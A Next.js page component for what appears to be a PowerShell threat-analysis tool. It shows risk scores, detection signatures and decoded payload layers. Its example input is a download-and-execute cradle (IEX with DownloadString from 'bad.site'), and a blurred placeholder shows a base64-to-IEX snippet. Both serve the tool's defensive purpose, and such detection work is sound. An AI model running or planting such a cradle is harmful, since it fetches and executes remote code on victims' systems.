"use client";
import { useParams, useRouter } from "next/navigation";
import { useEffect, useState, useCallback, useRef } from "react";
import { useAuth } from "../../contexts/AuthContext";
import { useAnalysisEvent } from "../../contexts/AnalysisEventContext";
import { useRateLimit } from "../../../hooks/useRateLimit";
import { useIpAddress } from "../../../hooks/useIpAddress";
import SeverityLegend from "../../components/SeverityLegend";
import AnalysisCard from "../../components/AnalysisCard";
import SeverityBadge from "../../components/SeverityBadge";
import IndicatorTable from "../../components/IndicatorTable";
import ThemedButton from "../../components/ThemedButton";
import LoadingSpinner from "../../components/LoadingSpinner";
import AnalysisSkeleton from "../../components/AnalysisSkeleton";
import CommandInput from "../../components/CommandInput";
import { ErrorMessage, InfoMessage } from "../../components/Messages";
import IndicatorsSummaryTable from "../../components/IndicatorsSummaryTable";

import { saveAnonymousAnalysis } from "../../../utils/cookies";
import { getOrCreateSession, saveSessionFromBackend } from "../../../utils/session";

// Score-based color system (5 bins from 1-10)
function getScoreColor(score) {
  if (score >= 10) return "border-red-600 text-red-600";           // Critical: 10.0+
  if (score >= 8) return "border-orange-400 text-orange-400";      // High: 8.0+
  if (score >= 5) return "border-yellow-400 text-yellow-400";      // Medium: 5.0+
  if (score >= 2) return "border-green-400 text-green-400";        // Low: 2.0+
  return "border-green-400 text-green-400";                          // Informational: 1.0
}

function getScoreLabel(score) {
  if (score >= 10) return "CRITICAL";
  if (score >= 8) return "HIGH";
  if (score >= 5) return "MEDIUM";
  if (score >= 2) return "LOW";
  return "INFORMATIONAL";
}

// ✅ Componente para conteúdo protegido
const ProtectedCodeBlock = ({ code, borderColorClass = "border-gray-500/20", limitReached = false }) => {
  const isProtected = code === "[PREMIUM_PROTECTED_CONTENT]";

  if (isProtected) {
    return (
      <div className={`bg-black rounded-lg p-3 border ${borderColorClass} relative overflow-hidden min-h-[140px]`}>
        {/* Blurred Placeholder Content as Background Layer */}
        <div className="absolute inset-0 blur-md select-none opacity-40 pointer-events-none font-mono text-xs leading-relaxed z-0" aria-hidden="true">
          {`# Premium content hidden
$payload = [System.Convert]::FromBase64String("SGVsbG8gV29ybGQ=")
IEX([System.Text.Encoding]::Unicode.GetString($payload))
# Advanced decoding available to premium subscribers
# Threat analysis requires elevated access
# ...`}
        </div>


        <div className="absolute inset-0 flex flex-col items-center justify-center z-10 bg-black/60 backdrop-blur-xl backdrop-saturate-150 border border-green-500/20 rounded-lg">

          <div className="absolute inset-0 bg-gradient-to-br from-green-500/5 to-transparent rounded-lg"></div>


          <div className="relative rounded-xl p-6 flex flex-col items-center gap-3 shadow-2xl">

            <div className="text-4xl drop-shadow-lg" >
              {limitReached ? "⏳" : "🔒"}
            </div>

            <span className="font-mono font-bold text-green-400 text-lg tracking-wide drop-shadow-lg" style={{ color: 'var(--accent)', filter: 'drop-shadow(0 0 8px rgba(34, 197, 94, 0.6))' }}>
              {limitReached ? "Daily Decode Limit Reached" : "Premium Feature"}
            </span>
            <span className="text-xs text-gray-300 text-center leading-relaxed font-mono">
              {limitReached
                ? "You have reached your daily limit of 5 decodes. Upgrade to Premium for unlimited access."
                : "Exclusive decoded & deobfuscated payloads for premium users. Upgrade to unlock advanced threat intelligence."
              }
            </span>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className={`bg-black rounded p-3 border ${borderColorClass} text-xs sm:text-sm font-mono overflow-x-auto max-h-40 whitespace-pre-wrap break-words`} style={{ color: 'var(--foreground)' }}>
      <code>{code}</code>
    </div>
  );
};

export default function AnalysisDetailsPage() {
  const params = useParams();
  const router = useRouter();
  const { user, isAuthenticated } = useAuth();
  const { notifyNewAnalysis } = useAnalysisEvent();
  const { ipAddress, ipCountry, loading: ipLoading, error: ipError } = useIpAddress();
  const {
    rateLimitInfo,
    handleRateLimitResponse,
    reset: resetRateLimit,
    timeLeft,
    isTimerActive,
    formatTime
  } = useRateLimit();
  const [result, setResult] = useState(null);
  const [cmd, setCmd] = useState("");
  const [loading, setLoading] = useState(true);
  const [newAnalysisLoading, setNewAnalysisLoading] = useState(false);
  const [error, setError] = useState("");
  const [newCommand, setNewCommand] = useState("");
  const [cacheHit, setCacheHit] = useState(false);
  const [isCacheRedirect, setIsCacheRedirect] = useState(false);
  const [cacheRedirectInfo, setCacheRedirectInfo] = useState(null);
  const [contentReady, setContentReady] = useState(false);
  const analysisExecutedRef = useRef(false);

  useEffect(() => {
    const cacheRedirectInfo = sessionStorage.getItem('cache_redirect_info');
    if (cacheRedirectInfo) {
      try {
        const info = JSON.parse(cacheRedirectInfo);
        if (info.is_cache_hit && info.analysis_id === params.id) {
          setIsCacheRedirect(true);
          setCacheRedirectInfo(info);
          setLoading(true); // Keep loading state for smooth transition

          sessionStorage.removeItem('cache_redirect_info');
        }
      } catch (e) {
        console.error('Error parsing cache redirect info:', e);
      }
    }
  }, [params.id]);

  const loadAnalysis = useCallback(async () => {
    try {
      setLoading(true);
      setContentReady(false);
      setError("");

      const loadStartTime = performance.now();

      const { makeAuthenticatedRequest } = await import('../../../lib/api');
      const res = await makeAuthenticatedRequest(`/analysis/${params.id}`, {
        headers: isCacheRedirect ? {
          'Cache-Control': 'max-age=300',
          'X-Cache-Redirect': 'true'
        } : {}
      });

      if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
      const analysisData = await res.json();

      const loadTime = performance.now() - loadStartTime;

      const analysis = analysisData.analysis || analysisData;
      const analysisResult = analysis.analysis_result || analysis;

      setCmd(analysis.command || analysisResult.command);
      setNewCommand(analysis.command || analysisResult.command);

      const processedResult = {
        score: analysis.risk_score || analysisResult.risk_score || 0,
        severity: (analysis.risk_score || analysisResult.risk_score || 0) > 5 ? "malicious" : "safe",
        signatures: (analysis.signatures_detected || analysisResult.signatures_detected || []).sort((a, b) => (b.total_score || 0) - (a.total_score || 0)),
        decoded: analysis.decoded_command || analysisResult.decoded_command || null,
        doubleDecoded: analysis.double_decoded_command || analysisResult.double_decoded_command || null,
        deobfuscated: analysis.deobfuscated_command || analysisResult.deobfuscated_command || null,
        decodeLimitReached: analysis.decode_limit_reached || analysisResult.decode_limit_reached || false,
        indicators: analysisResult.analysis_details?.indicators || [],
        details: analysisResult.analysis_details?.recommendations?.join(", ") || "",
        tactics: analysis.tactics || analysisResult.tactics || [],
        techniques: analysis.techniques || analysisResult.techniques || [],
        analysisId: params.id
      };

      setResult(processedResult);

      // Smooth transition delay
      setTimeout(() => {
        setContentReady(true);
        setLoading(false);
      }, 150);

    } catch (err) {
      setError(err.message || "Failed to load analysis");
      setLoading(false);
      setContentReady(true);
    }
  }, [params.id, isCacheRedirect]); // ✅ FIX: Remover cacheRedirectInfo da dependência


  useEffect(() => {
    if (params.id) {
      loadAnalysis();
    }
  }, [params.id, loadAnalysis]);


  const performAnalysis = async (command, providedIpAddress, providedIpCountry) => {
    const finalIpAddress = providedIpAddress || ipAddress;
    const finalIpCountry = providedIpCountry || ipCountry;
    try {
      setNewAnalysisLoading(true);
      setError("");
      setCacheHit(false);

      console.log("🔍 [ANALYSIS_PAGE] Analyzing command:", command.substring(0, 100) + "...");

      const startTime = performance.now();
      const sessionId = getOrCreateSession();

      // ✅ FIX: Enviar comando sem trim - preservar espaços
      const requestData = {
        command: command, // ✅ SEM TRIM
        user_id: user?.id || null,
        ip_address: finalIpAddress,
        country: finalIpCountry,
        user_agent: navigator.userAgent,
        search_type: "WEB",
        session_id: sessionId
      };

      console.log("🌐 [ANALYSIS_PAGE] Request type:", user?.id ? "Authenticated WEB" : "Anonymous WEB");

      const { makeAuthenticatedRequest } = await import('../../../lib/api');

      const response = await makeAuthenticatedRequest('/evaluate', {
        method: 'POST',
        body: JSON.stringify(requestData)
      });

      const data = await response.json();


      const responseTime = performance.now() - startTime;


      const isCacheHit = data.from_cache === true || data.analysis?.cache_info?.cache_hit === true;

      if (isCacheHit) {
        setCacheHit(true);
      }


      const needsHandling = handleRateLimitResponse(response, data);

      if (needsHandling) {
        setNewAnalysisLoading(false);
        return;
      }

      if (!response.ok) {
        throw new Error(data.error || `HTTP error! status: ${response.status}`);
      }

      if (data.success) {
        const analysisData = data.analysis;

        if (!data.analysis_id || data.analysis_id === "temp-cache-id" || data.analysis_id === "cache-error") {
          setError("Analysis error - please try again");
          setNewAnalysisLoading(false);
          return;
        }


        if (data.session_id && !user?.id) {
          saveSessionFromBackend(data.session_id);
        }


        if (!user?.id) {
          try {
            saveAnonymousAnalysis({
              command: command,
              score: analysisData.risk_score,
              severity: analysisData.is_malicious ? "malicious" : "safe",
              signatures: analysisData.signatures_detected || [],
              cmdlets_detected: analysisData.cmdlets_detected || [],
              analysis_id: data.analysis_id
            });
          } catch (error) {

          }
        }


        if (data.analysis_id) {

          notifyNewAnalysis();

          if (isCacheHit) {
            sessionStorage.setItem('cache_redirect_info', JSON.stringify({
              is_cache_hit: true,
              analysis_id: data.analysis_id,
              redirect_time: Date.now(),
              phash: data.analysis?.cache_info?.phash,
              response_time_ms: responseTime
            }));

            router.replace(`/analysis/${data.analysis_id}`);
          } else {
            router.push(`/analysis/${data.analysis_id}`);
          }
          return;
        }

        const analysisResult = {
          score: analysisData.risk_score,
          severity: analysisData.is_malicious ? "malicious" : "safe",
          signatures: (analysisData.signatures_detected || []).sort((a, b) => (b.total_score || 0) - (a.total_score || 0)),
          decoded: analysisData.decoded_command,
          doubleDecoded: analysisData.double_decoded_command,
          deobfuscated: analysisData.deobfuscated_command,
          decodeLimitReached: analysisData.decode_limit_reached || false,
          indicators: analysisData.analysis_details?.indicators || [],
          details: analysisData.analysis_details?.recommendations?.join(", ") || "",
          tactics: analysisData.tactics || [],
          techniques: analysisData.techniques || [],
          analysisId: response.analysis_id
        };

        setResult(analysisResult);
        setCmd(command);
      } else {
        throw new Error(response.error || 'Analysis failed');
      }
    } catch (err) {

      if (err.message === 'Rate limit excedido') {
        setNewAnalysisLoading(false);
        return;
      }

      setError(err.message);
      setResult(null);
    } finally {
      setNewAnalysisLoading(false);
    }
  };

  const handleNewAnalysis = async () => {
    // ✅ FIX: Enviar comando raw sem validação de trim
    if (newCommand.length > 0) {
      if (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit) {
        setError("Rate limit reached. Please wait for the timer to reset.");
        return;
      }

      analysisExecutedRef.current = false;
      setError("");

      // ✅ FIX: Enviar comando raw sem trim ou validação
      await performAnalysis(newCommand);

      setNewCommand("");
    }
  };

  const totalScore = result ? result.score : 0;


  if (loading) {
    return <LoadingSpinner />;
  }

  if (!contentReady) {
    return null; // Or a minimal placeholder if needed
  }

  // ✅ Verificar se o indicador de obfuscação foi detectado
  const hasObfuscationIndicator = result?.signatures?.some(
    sig => sig.name === "Obfuscation Detected"
  );

  return (
    <div className="flex-1 flex flex-col items-center justify-center p-4 sm:p-6 md:p-8 animate-fade-in">
      <style jsx>{`
        @keyframes fade-in {
          from {
            opacity: 0;
            transform: translateY(10px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-fade-in {
          animation: fade-in 0.4s ease-out;
        }
      `}</style>
      <h1 className="text-2xl sm:text-3xl md:text-4xl font-mono font-bold mb-6 sm:mb-8 text-center" style={{ color: 'var(--accent)' }}>
        Evaluation Results
      </h1>


      <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
        <div className="flex flex-col sm:flex-row gap-3 items-start">
          <div className="flex-1 w-full">
            <CommandInput
              value={newCommand}
              onChange={(e) => setNewCommand(e.target.value)}
              onSubmit={handleNewAnalysis}
              placeholder="Type or paste a PS payload..."
              disabled={newAnalysisLoading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
            />
          </div>
          <ThemedButton
            onClick={handleNewAnalysis}
            disabled={newCommand.length === 0 || newAnalysisLoading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
            className="flex-shrink-0"
            loading={newAnalysisLoading}
          >
            {newAnalysisLoading ? 'Analyzing...' : 'Evaluate'}
          </ThemedButton>
        </div>

        {/* Loading overlay for new analysis */}
        {newAnalysisLoading && (
          <div className="mt-4 p-4 rounded-lg border bg-black/80 border-green-500/30 text-center">
            <LoadingSpinner />
          </div>
        )}
        <InfoMessage
          message={!error && newCommand.length === 0 ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
          clickable={!error && newCommand.length === 0}
          onClick={() => setNewCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
        />
      </div>

      {rateLimitInfo && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mt-4 mb-6 rounded-lg border-2 bg-black/80 border-green-500/30">
          <div className="p-4">
            <div className="text-center mb-4">
              <div className="font-mono text-sm mb-2" style={{ color: 'var(--muted-foreground)' }}>
                <strong>Notice:</strong> You have made <span style={{ color: 'var(--accent)' }}>{rateLimitInfo.current_count}</span> of <span style={{ color: 'var(--accent)' }}>{rateLimitInfo.limit}</span> allowed searches in {rateLimitInfo.window_seconds} seconds.
              </div>
            </div>

            {rateLimitInfo.current_count >= rateLimitInfo.limit && (
              <div>
                <div className="text-center mb-6">
                  <div className="inline-flex items-center gap-3 px-4 py-2 rounded-full border-2 border-red-500 bg-black/80 border-green-500/30">
                    <span className="text-2xl">🚫</span>
                    <span className="font-mono font-bold text-red-500">Rate limit reached</span>
                  </div>
                </div>

                {isTimerActive && timeLeft > 0 && (
                  <div className="text-center">
                    <div className="inline-block p-6 rounded-xl border-2 bg-black/80 border-green-500/30">
                      <div className="text-4xl mb-3">⏰</div>

                      <div className="font-mono font-bold text-xl mb-3" style={{ color: 'var(--accent)' }}>
                        Wait for reset
                      </div>

                      <div className="font-mono text-3xl font-bold mb-4 px-4 py-2 rounded-lg border bg-black/80 border-green-500/30" style={{
                        color: 'var(--accent)'
                      }}>
                        {formatTime}
                      </div>

                      <div className="font-mono text-sm max-w-xs mx-auto" style={{ color: 'var(--muted-foreground)' }}>
                        You can make new searches when the timer reaches zero
                      </div>

                      <div className="mt-4 w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
                        <div
                          className="h-2 rounded-full transition-all duration-1000"
                          style={{
                            backgroundColor: 'var(--accent)',
                            width: `${Math.max(0, (timeLeft / 60) * 100)}%`
                          }}
                        ></div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}



      {result && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="p-4 sm:p-6 rounded-lg border-2 border-green-400 text-center relative bg-black/80 border-green-500/30">
            <div className="absolute top-4 right-4">
              <SeverityLegend />
            </div>

            <div className="text-lg sm:text-xl font-mono font-bold mb-3 text-green-400">
              Cumulative Base Score
            </div>
            <div className="text-4xl sm:text-5xl font-mono font-bold mb-3 text-white">
              {totalScore.toFixed(1)}
            </div>
            <div className="text-xs sm:text-sm font-mono text-green-400 mb-2">
              {totalScore === 0 ? "No Malicious Indicators Detected" : "Cumulative score from all patterns"}
            </div>
            {result.signatures && result.signatures.length > 0 && (
              <div className="text-xs font-mono text-gray-400  pt-3 mt-3">
                {(() => {
                  const securitySigs = result.signatures.filter(sig =>
                    !sig.name.includes('(') || sig.score >= 4.0 || !sig.techniques?.includes('T1059.001') || sig.tactics?.length > 1
                  );
                  const allCmdlets = result.signatures.filter(sig =>
                    sig.name.includes('(') && sig.score < 4.0 && sig.techniques?.includes('T1059.001') && sig.tactics?.length <= 1
                  );

                  const securityScore = securitySigs.reduce((sum, sig) => sum + (sig.total_score || sig.score || 0), 0);
                  const allCmdletScore = allCmdlets.reduce((sum, sig) => sum + (sig.total_score || sig.score || 0), 0);

                  return (
                    <>
                      {allCmdletScore > 0 && <div>PowerShell Cmdlets: {allCmdletScore.toFixed(1)}</div>}
                    </>
                  );
                })()}
              </div>
            )}
          </div>
        </div>
      )}
      {/* {result && result.decoded && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="border rounded-lg p-4 bg-black/80 border-blue-500/30">
            <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
              {result.doubleDecoded ? "First Decoded Layer" : "Decodified Command"}
            </div>
            <div className="bg-black rounded p-3 border border-blue-500/20 text-xs sm:text-sm font-mono overflow-x-auto max-h-40 whitespace-pre-wrap break-words" style={{color: 'var(--foreground)'}}>
              <code>{result.decoded}</code>
            </div>
            <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
              {result.doubleDecoded ? "First layer of decoding from Base64" : "This is the decoded/deobfuscated version of the command"}
            </div>
          </div>
        </div>
      )} */}

      {/* ✅ BLOCO 1: Deobfuscated (PRIMEIRO - aparece APENAS se indicador estiver presente) */}
      {result && result.deobfuscated && hasObfuscationIndicator && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="border rounded-lg p-4 bg-black/80 border-purple-500/30">
            <div className="font-mono text-sm font-bold mb-3" style={{ color: 'var(--accent)' }}>
              🔓 Deobfuscated Command
            </div>
            <ProtectedCodeBlock code={result.deobfuscated} borderColorClass="border-purple-500/20" limitReached={result.decodeLimitReached} />
            <div className="text-xs font-mono mt-2" style={{ color: 'var(--muted-foreground)' }}>
              Format string obfuscation was removed (e.g., &#123;&quot;&#123;1&#125;&#123;0&#125;&quot; -f &apos;EX&apos;,&apos;I&apos;&#125; → &apos;IEX&apos;)
            </div>
          </div>
        </div>
      )}

      {/* ✅ BLOCO 2: First Decoded Layer (double-encoded: decoded && doubleDecoded) */}
      {result && result.decoded && result.doubleDecoded && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="border rounded-lg p-4 bg-black/80 border-blue-500/30">
            <div className="font-mono text-sm font-bold mb-3" style={{ color: 'var(--accent)' }}>
              First Decoded Layer (Iteration 1)
            </div>
            <ProtectedCodeBlock code={result.decoded} borderColorClass="border-blue-500/20" limitReached={result.decodeLimitReached} />
            <div className="text-xs font-mono mt-2" style={{ color: 'var(--muted-foreground)' }}>
              First layer of decoding - still contains -EncodedCommand
            </div>
          </div>
        </div>
      )}

      {/* ✅ BLOCO 3: Decoded Command (single-encoded: decoded && !doubleDecoded) */}
      {result && result.decoded && !result.doubleDecoded && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="border rounded-lg p-4 bg-black/80 border-blue-500/30">
            <div className="font-mono text-sm font-bold mb-3" style={{ color: 'var(--accent)' }}>
              Decoded Command
            </div>
            <ProtectedCodeBlock code={result.decoded} borderColorClass="border-blue-500/20" limitReached={result.decodeLimitReached} />
            <div className="text-xs font-mono mt-2" style={{ color: 'var(--muted-foreground)' }}>
              This is the decoded version from -EncodedCommand
            </div>
          </div>
        </div>
      )}

      {/* ✅ BLOCO 4: Final Decoded (doubleDecoded exists) */}
      {result && result.doubleDecoded && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="border rounded-lg p-4 bg-black/80 border-yellow-500/30">
            <div className="font-mono text-sm font-bold mb-3" style={{ color: 'var(--accent)' }}>
              Final Decoded Command (Iteration 2)
            </div>
            <ProtectedCodeBlock code={result.doubleDecoded} borderColorClass="border-yellow-500/20" limitReached={result.decodeLimitReached} />
            <div className="text-xs font-mono mt-2" style={{ color: 'var(--muted-foreground)' }}>
              Final layer decoded from multiple nested -EncodedCommand (2+ layers detected)
            </div>
          </div>
        </div>
      )}

      {result && result.signatures && result.signatures.length > 0 && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          {(() => {
            const realSignatures = result.signatures.filter(sig =>
              !sig.name.includes('(') ||
              sig.score >= 4.0 ||
              !sig.techniques?.includes('T1059.001') ||
              sig.tactics?.length > 1
            );

            const basicCmdlets = result.signatures.filter(sig =>
              sig.name.includes('(') &&
              sig.score < 4.0 &&
              sig.techniques?.includes('T1059.001') &&
              sig.tactics?.length <= 1
            );

            return (
              <>
                {/* ✅ NOVO: Tabela de resumo */}
                {realSignatures.length > 0 && (
                  <IndicatorsSummaryTable signatures={realSignatures} />
                )}

                {realSignatures.length > 0 && (
                  <div className="mb-6">
                    <h2 className="text-lg sm:text-xl font-mono font-bold mb-4" style={{ color: 'var(--foreground)' }}>
                      Indicators Breakdown
                    </h2>
                    <div className="space-y-4">
                      {realSignatures.map((signature, index) => (
                        <AnalysisCard
                          key={`real-${index}`}
                          index={index}  // ✅ Passar index
                          title={signature.name || 'Unknown Pattern'}
                          description={signature.description || `Pattern detected: ${signature.pattern || 'No description available'}`}
                          severity={signature.severity || 'unknown'}
                          score={signature.total_score || signature.score || 0}
                          pattern={signature.pattern || 'No pattern specified'}
                          matched_text={signature.matched_text || signature.matchedText || ''}
                          matched_command={signature.matched_command || signature.matchedCommand || ''}
                          keywords={signature.pattern || signature.keyword || ''}
                          tactic={signature.tactics || signature.tactic || []}
                          technique={signature.techniques || signature.technique || []}
                          reference={signature.reference || ''}
                          link={signature.link || null}
                          matchesInfo={{
                            matchesFound: signature.matches_found || 1,
                            baseScore: signature.base_score || signature.score || 0,
                            totalScore: signature.total_score || signature.score || 0,
                            maxMatchAllowed: signature.max_match_allowed || signature.max_match || 1,
                            matchesDetails: signature.matches_details || signature.matchesDetails || []
                          }}
                        />
                      ))}
                    </div>
                  </div>
                )}

                {/* ...existing code for basicCmdlets... */}
              </>
            );
          })()}
        </div>
      )}

      {result && (!result.signatures || result.signatures.length === 0) && totalScore === 0 && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="border rounded-lg p-6 text-center bg-black/80 border-green-500/30">
            <h2 className="text-lg sm:text-xl font-mono font-bold mb-2" style={{ color: 'var(--foreground)' }}>
              Zero indicators found
            </h2>
            <p className="text-sm sm:text-base font-mono" style={{ color: 'var(--muted-foreground)' }}>
              This command does not seem to match any indicator.
            </p>
          </div>
        </div>
      )}

      {result && result.signatures && result.signatures.length > 0 && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="border rounded-lg p-4 bg-black/80 border-green-500/30">
            <div className="font-mono text-sm" style={{ color: 'var(--muted-foreground)' }}>
              Matched indicators are not inherently suspicious but highlight traces that may require closer examination. For interpretation details, check the link below:
              <br /><br />
              <span style={{ color: 'var(--primary-purple)' }}>&lt;wiki link to be provided later&gt;</span>
            </div>
          </div>
        </div>
      )
      }
      <div className="flex flex-col sm:flex-row gap-3 justify-center mb-8">
        <ThemedButton onClick={() => router.push('/')}>
          Evaluate Another Command
        </ThemedButton>
        <ThemedButton
          variant="outline"
          onClick={() => {
            const baseUrl = window.location.origin;
            const shareUrl = result?.analysisId
              ? `${baseUrl}/analysis/${result.analysisId}`
              : window.location.href;
            navigator.clipboard.writeText(shareUrl);
          }}
        >
          Copy sharable link
        </ThemedButton>
      </div>
    </div>
  );
}
